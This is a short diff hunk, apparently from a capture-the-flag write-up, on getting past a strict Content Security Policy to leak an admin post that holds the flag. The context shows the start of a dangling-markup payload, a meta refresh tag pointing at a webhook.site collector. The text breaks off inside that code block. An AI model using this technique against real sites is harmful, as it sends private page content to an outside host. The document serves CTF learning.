@@ -23,7 +23,7 @@ This has the following (important to note) consequences:
 1. No javascript is allowed to execute at all on the page. 
 2. Unsafe-inline isn't set, so inline <style></style> tags are also blocked. 
 
-The flag is in the admin post below. To leak the post, you can do dangling markdown to do the following:
+The flag is in the admin post below. To leak the post, you can do dangling markdown as follows:
 
 ```
 <meta http-equiv="refresh" content='0; url=https://webhook.site/#!/your_webhook_site_id?
